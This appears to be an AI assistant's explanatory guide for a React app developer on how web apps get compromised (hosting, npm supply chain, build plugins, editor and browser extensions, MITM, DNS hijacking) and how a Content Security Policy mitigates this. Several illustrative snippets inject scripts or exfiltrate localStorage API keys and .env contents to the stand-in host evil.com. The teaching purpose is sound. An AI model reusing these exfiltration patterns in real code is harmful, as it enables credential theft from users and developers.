# How Your Code Gets Compromised - Real World Scenarios

## What Does "Compromised" Mean?

**Compromised** = An attacker gains the ability to modify or inject code into your application that you didn't write.

Even though **you wrote safe code**, attackers can still inject malicious code through:
1. Your hosting infrastructure
2. Your supply chain (dependencies)
3. Your development tools
4. Your deployment pipeline

Let me show you real examples...

---

## Scenario 1: Hosting Provider Compromise

### How It Happens

**Your situation**:
- You write clean, safe React code
- You build it: `npm run build`
- You upload the `dist/` folder to a hosting service (Netlify, Vercel, GitHub Pages, etc.)

**Attack vector**:
```
Your files:                    Attacker modifies:
dist/
  index.html                   index.html ← INJECTED CODE HERE
  assets/
    main-abc123.js             main-abc123.js ← INTACT
    style-xyz789.css           style-xyz789.css ← INTACT
```

**What the attacker does**:
1. Hacks into your hosting provider's servers (or just your account with stolen password)
2. Modifies `index.html` on the server:

```html
<!-- Your original index.html -->
<!DOCTYPE html>
<html>
  <head>
    <script type="module" src="/assets/main-abc123.js"></script>
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>

<!-- After attacker modifies it on the server -->
<!DOCTYPE html>
<html>
  <head>
    <script src="https://evil.com/stealer.js"></script> <!-- INJECTED -->
    <script type="module" src="/assets/main-abc123.js"></script>
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
```

**The malicious `stealer.js`**:
```javascript
// This code runs BEFORE your React app loads
// It steals the API key and sends it to the attacker

setTimeout(() => {
  const apiKey = localStorage.getItem('SETTINGS_API_KEY');
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      apiKey: apiKey,
      url: window.location.href,
      timestamp: Date.now()
    })
  });
}, 1000);
```

**Result**:
- Your code is still safe and secure
- But the attacker's code runs first
- User's API key is stolen
- User has no idea (everything looks normal)

### Real World Examples

**1. Netlify CDN Compromise (Hypothetical)**
- Attacker gains access to Netlify's CDN servers
- Modifies HTML files for thousands of sites
- All users get infected when they visit

**2. Stolen Hosting Credentials**
- Your GitHub account gets phished
- Attacker logs into GitHub Pages settings
- Deploys modified version of your site

**3. Compromised CI/CD Pipeline**
- Attacker hacks your GitHub Actions
- Modifies the deploy script to inject code during build
- Every deployment now includes malicious code

---

## Scenario 2: Supply Chain Attack (npm Dependencies)

### How It Happens

**Your situation**:
- Your `package.json` has 50+ dependencies
- Each dependency has its own dependencies (transitive)
- Total: ~1,000+ packages installed

**Attack vector**:
```
Your app
  └─ depends on react-icons (safe)
      └─ depends on some-helper-lib (safe)
          └─ depends on tiny-util-package ← COMPROMISED
```

**What the attacker does**:

1. **Option A: Maintainer account takeover**
   - Attacker steals npm credentials of `tiny-util-package` maintainer
   - Publishes version `1.0.5` with malicious code
   - You run `npm update`
   - Malicious code is now in your `node_modules/`

2. **Option B: Typosquatting**
   - Real package: `lodash`
   - Attacker creates: `loadash` (with 'a' instead of 'o')
   - Developer makes typo in `package.json`
   - Malicious package installed

**Example malicious code in a dependency**:

```javascript
// File: node_modules/tiny-util-package/index.js

// Original safe code
export function formatDate(date) {
  return date.toISOString();
}

// Malicious code added by attacker
if (typeof window !== 'undefined') {
  // Only runs in browser (not during build)
  window.addEventListener('load', () => {
    const keys = Object.keys(localStorage);
    const data = {};
    keys.forEach(key => data[key] = localStorage.getItem(key));

    // Sends all localStorage data to attacker
    fetch('https://collector.evil.com/harvest', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
}
```

**Result**:
- Your code is clean
- Your dependencies are compromised
- Malicious code is bundled into your `main-abc123.js`
- Every user who visits your app gets infected

### Real World Examples

**1. event-stream (2018)**
- Popular npm package with 2M downloads/week
- Maintainer gave access to new contributor
- New contributor added malicious code
- Code stole Bitcoin wallet credentials
- Affected thousands of apps

**2. ua-parser-js (2021)**
- 8M downloads/week
- Attacker compromised maintainer's npm account
- Published versions with crypto mining malware
- Impacted major companies

**3. colors.js & faker.js (2022)**
- Maintainer intentionally sabotaged own packages
- Added infinite loop code
- Broke thousands of applications

---

## Scenario 3: Build Tool Compromise

### How It Happens

**Your situation**:
- You use Vite to build your app
- Vite uses esbuild, rollup, and dozens of plugins
- All of these are npm packages

**Attack vector**:
```
npm run build
  ↓
vite (safe)
  ↓
@vitejs/plugin-react (safe)
  ↓
esbuild (safe)
  ↓
some-vite-plugin ← COMPROMISED
```

**What the attacker does**:

Compromises a Vite plugin, adds code to inject during build:

```javascript
// File: node_modules/some-vite-plugin/index.js

export default function maliciousPlugin() {
  return {
    name: 'malicious-plugin',
    transformIndexHtml(html) {
      // Inject script tag during build
      return html.replace(
        '</head>',
        '<script src="https://evil.com/tracker.js"></script></head>'
      );
    }
  };
}
```

**Result**:
- Your source code is clean
- Build process is compromised
- Generated `dist/index.html` contains malicious script
- You deploy the compromised build

---

## Scenario 4: Development Tool Compromise

### How It Happens

**Your situation**:
- You use VS Code
- You install extensions for productivity
- You use Chrome browser

**Attack vector**:

**Malicious VS Code Extension**:
```javascript
// Extension that seems helpful: "React Code Snippets Pro"

// But secretly, it does this:
const fs = require('fs');
const path = require('path');

// When you save a file, extension reads your .env files
vscode.workspace.onDidSaveTextDocument((document) => {
  if (document.fileName.includes('.env')) {
    const content = document.getText();

    // Sends .env contents to attacker
    fetch('https://evil.com/env-collector', {
      method: 'POST',
      body: content
    });
  }
});
```

**Malicious Browser Extension**:
```javascript
// Extension: "React DevTools Plus" (fake clone of real React DevTools)

// Runs on all websites you visit
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url.includes('localhost') || tab.url.includes('meal-planner')) {
    // Inject script into your app
    chrome.tabs.executeScript(tabId, {
      code: `
        // Reads localStorage
        const apiKey = localStorage.getItem('SETTINGS_API_KEY');
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify({ apiKey })
        });
      `
    });
  }
});
```

**Result**:
- Your code is safe
- Your development environment is compromised
- Attacker steals secrets while you're developing

---

## Scenario 5: Man-in-the-Middle (MITM) Attack

### How It Happens

**Your situation**:
- User visits your site: `http://meal-planner.com` (no HTTPS!)
- Or user is on public WiFi

**Attack vector**:

```
User's Browser
    ↓ HTTP request: meal-planner.com
    ↓
Public WiFi Router ← ATTACKER CONTROLS THIS
    ↓ Attacker modifies response
    ↓
Your Server
```

**What the attacker does**:

Sits between user and your server, modifies traffic:

```
User requests: http://meal-planner.com/index.html

Attacker intercepts and modifies response:
- Adds: <script src="https://evil.com/inject.js"></script>
- Forwards modified HTML to user

User receives compromised HTML
```

**Result**:
- Your server has clean code
- Network traffic is compromised
- User gets infected version

### Real World Examples

**1. Starbucks WiFi (2014)**
- Starbucks WiFi injected ads into HTTP pages
- Used by AT&T's "Internet Preferences" program
- Could inject any code into any HTTP site

**2. Comcast (2017)**
- Injected JavaScript into HTTP traffic
- Used for copyright warnings
- Demonstrated ISPs can modify traffic

---

## Scenario 6: DNS Hijacking

### How It Happens

**Your situation**:
- Your domain: `meal-planner.com`
- DNS points to Netlify's servers

**Attack vector**:

```
User types: meal-planner.com
    ↓
DNS Lookup: "What's the IP for meal-planner.com?"
    ↓
DNS Server ← ATTACKER COMPROMISES THIS
    ↓
Returns: 192.168.1.666 (attacker's server) instead of real IP
    ↓
User connects to attacker's fake site
```

**What the attacker does**:

1. Hacks your domain registrar account (GoDaddy, Namecheap, etc.)
2. Changes DNS records to point to attacker's server
3. Creates fake copy of your site with malicious code
4. Users visit "your site" but it's actually attacker's server

**Result**:
- Your actual code is safe on your server
- But users never reach your server
- They get attacker's fake version

### Real World Examples

**1. MyEtherWallet (2018)**
- DNS hijacked for 2 hours
- Users redirected to phishing site
- $150,000 in cryptocurrency stolen

**2. Namecheap (2019)**
- DNS changed for several domains
- Users redirected to fake sites

---

## How CSP Protects You

Now let's revisit CSP with these scenarios in mind:

### Without CSP:

**Scenario 1: Hosting compromised**
```html
<script src="https://evil.com/stealer.js"></script>
```
❌ Script loads and runs → API key stolen

### With CSP `script-src 'self'`:

```html
<script src="https://evil.com/stealer.js"></script>
```
✅ Browser **REFUSES** to load external script
✅ Console shows: "Refused to load script from 'https://evil.com'"
✅ API key stays safe

---

### Without CSP:

**Scenario 2: Dependency compromised**
```javascript
// Malicious code in node_modules
fetch('https://evil.com/collect', {
  body: JSON.stringify(localStorage)
});
```
❌ Data sent to evil.com → Everything stolen

### With CSP `connect-src 'self' https://api.anthropic.com`:

```javascript
fetch('https://evil.com/collect', {
  body: JSON.stringify(localStorage)
});
```
✅ Browser **BLOCKS** the request
✅ Console shows: "Refused to connect to 'https://evil.com'"
✅ Data stays local

---

### Without CSP:

**Scenario 5: MITM attack**
```html
<!-- Attacker injects iframe -->
<iframe src="https://evil.com/phishing"></iframe>
```
❌ Iframe loads → User tricked

### With CSP `frame-src 'self'`:

```html
<iframe src="https://evil.com/phishing"></iframe>
```
✅ Browser **BLOCKS** the iframe
✅ Console shows: "Refused to load 'https://evil.com' in a frame"
✅ User protected

---

## The Key Insight

**Your code being "compromised" doesn't mean YOU made a mistake.**

It means:
- ❌ NOT: "You wrote vulnerable code"
- ✅ YES: "Attackers modified your code somewhere between your keyboard and user's browser"

**The attack surface**:
```
Your Keyboard
    ↓
Your Editor ← Could be compromised (malicious extension)
    ↓
Your node_modules ← Could be compromised (supply chain)
    ↓
Your Build Process ← Could be compromised (malicious plugin)
    ↓
Your Deployment ← Could be compromised (CI/CD hack)
    ↓
Your Hosting Server ← Could be compromised (hosting hack)
    ↓
DNS ← Could be hijacked
    ↓
Network (ISP/WiFi) ← Could be MITM'd
    ↓
User's Browser ← FINALLY, YOUR CODE RUNS

```

**CSP is defense-in-depth**: Even if attackers compromise ANY of these steps, CSP acts as a **last line of defense in the browser**.

---

## Likelihood Assessment

**How likely are these attacks for your personal project?**

| Scenario | Likelihood | Impact | Priority |
|----------|-----------|--------|----------|
| Hosting compromise | Low | High | Medium |
| Supply chain attack | Medium | High | High |
| Build tool compromise | Low | High | Medium |
| Dev tool compromise | Medium | Medium | Medium |
| MITM attack | Low (with HTTPS) | High | Low |
| DNS hijacking | Very Low | High | Low |

**Key points**:
- **Supply chain attacks are increasing** (event-stream, ua-parser-js, colors.js)
- **If you deploy publicly**, risk goes up significantly
- **Personal use only** = Lower risk, but still worth protecting
- **CSP is cheap insurance** (2 minutes to add, lifetime protection)

---

## Practical Recommendations

### Must Do (Even for Personal Use):

1. ✅ **Use HTTPS** - Prevents MITM attacks
2. ✅ **Strong passwords** - Prevents account takeovers
3. ✅ **2FA on GitHub/npm** - Prevents supply chain attacks

### Should Do (If Deploying Publicly):

4. ✅ **Add CSP** - Defense-in-depth protection
5. ✅ **Dependency scanning** - `npm audit` regularly
6. ✅ **Lock file** - Use `package-lock.json` to pin versions

### Nice to Have:

7. ✅ **Subresource Integrity (SRI)** - For any CDN resources
8. ✅ **CSP reporting** - Monitor violations in production
9. ✅ **Security headers** - X-Frame-Options, X-Content-Type-Options, etc.

---

## Summary

**"Code compromise" means**: Attackers inject malicious code somewhere between you writing it and users running it.

**Why it matters**: Your clean React code doesn't protect against infrastructure attacks.

**What CSP does**: Creates a browser-enforced whitelist that blocks injected malicious code, even if attackers compromise your hosting, dependencies, or build process.

**Bottom line**: You can write perfect code and still get hacked. CSP is your safety net.

---

## Want to See It in Action?

I can demonstrate:
1. How a compromised dependency would work WITHOUT CSP
2. How CSP blocks it
3. What you'd see in the browser console

Let me know if you'd like a practical demonstration!
